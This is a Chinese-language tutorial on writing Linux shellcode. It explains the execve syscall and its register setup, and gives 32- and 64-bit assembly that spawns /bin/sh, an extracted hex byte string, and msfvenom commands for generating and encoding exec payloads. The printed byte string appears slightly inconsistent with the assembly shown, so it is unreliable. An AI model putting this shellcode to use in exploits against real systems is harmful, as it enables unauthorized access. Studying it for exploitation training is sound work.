什么是shellcode

shellcode主要是一段**十六进制**数据，同时也是一段**可执行的代码**，如果想要通过漏洞拿到主机权限，那对shellcode的了解是必不可少的。linux的shellcode编写基本上只需要调用出命令行就行了，因为Linux的命令行已经能做到绝大部分事情了，除非execve系统调用被禁用（用来运行一个新进程)，导致无法运行一个新程序，那就只能通过别的办法完成了。

  

系统调用用来**与内核交互**

**32**为linux的部分系统调用号

  

“

  

#define \_\_NR\_restart\_syscall 0

 #define \_\_NR\_exit 1

 #define \_\_NR\_fork 2

#define \_\_NR\_read 3

#define \_\_NR\_write 4

 #define \_\_NR\_open 5

#define \_\_NR\_close 6

#define \_\_NR\_waitpid 7

#define \_\_NR\_creat 8

 #define \_\_NR\_link 9

 #define \_\_NR\_unlink 10

 #define \_\_NR\_execve 11

  
”

  

可以看到**execve系统调用号为11**

32位linux可以通过**int 0x80**指令进行系统调用

64位通过**syscall**进行系统调用

  

在进行int 0x80调用中，我们需要控制**四个寄存器**

  

**1**

第一个eax，令它为**11**，以进行execve系统调用

  

**2**

第二个ebx, 需要让它为指向我们需要执行程序的**字符串地址**，linux命令行程序是**\\bin\\sh**,我们需要构建这个地址

  

**3**

第三个ecx, 需要指向**程序参数**，这里我们并不需要参数，但我们知道所有程序的第一个参数都是它本身字符串，所有更改为指向**ebx**（‘bin/sh地址’）的地址就行了，也可以为0

  

**4**

第四个edx, 指向**环境**，可以为0

  

接下来，我们构造完整的代码

  

![](../Images/051e57f2b00f539f83c2fc8ca3905c0b.png)

  

  

  

“

  

xor eax,eax;  将eax赋值为0

push eax;  将 0 入栈

push "/sh"

push "/bin" ;将/bin/sh存入栈中

mov ebx,esp ；将字符串地址赋值给ebx

xor ecx,ecx; ecx置0

xor edx,edx; edx置0

mov al,0xb; 0xb就是11

int 0x80; 系统调用

objdump -d ./shellcode|grep '\[0-9a-f\]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

从而得到\\x31\\xc0\\x50\\x68\\x2f\\x73\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80

  

这个就是shellcode了！！！

64位shellcode，用**rdi,rsi,rdx**传参数

同时execve系统为**59**,稍微修改下就好了

  

“  

xor rdx, rdx

xor rsi, rsi

mov rbx,'/bin/sh'

push rbx

push rsp

pop rdi

mov al, 59

syscall

  
”

  

  

当然，我们没必要每次都去写shellcode

有很多工具可以供我们使用，比如**metasploit**,

可以提供绝大多数shellcode，并且还提供了编码器,

安装好后使用**msfconsole**命令就能够打开它

用**show payloads**命令就可以查看msf带的所有shellcode

![](../Images/f2536bb946d5ce3e3b3ffe33c84ab4d0.png)

看到有许多shellcode可供选择

我们再使用**msfvenom**就能生成指定的shellcode

命令为**msfvenom -p payload -f 语言形式**

（中间还有一些每个payload需要的参数）

比如生成我们上面编写的shellcode，只要使用

msfvenom -p linux/x86/exec CMD='/bin/sh' -f c

![](../Images/3b80d16abe5b745edb3117e161881618.png)

如果需要特定编码的shellcode

比如程序不接受\\x00字符串，可以使用编码器

可以使用**msfvenom --list encoders**查看所有编码器

![](../Images/e9ff3655dc4ed20827d4c05baa5c1b00.png)

然后我们再使用

msfvenom -p linux/x86/exec CMD='/bin/sh' -e x86/alpha\_upper -f c

就可以生成一份没零shellcode了

![](../Images/4de6a40b32b0f73c83819850658b4464.png)

  

  

有这么多编码器使用，已经可以应付绝大多数情况了，当然，遇到一些从来没有遇到的情况，还是需要我们自己编写，所有也需要多加练习shellcode的编写，应对各种情况
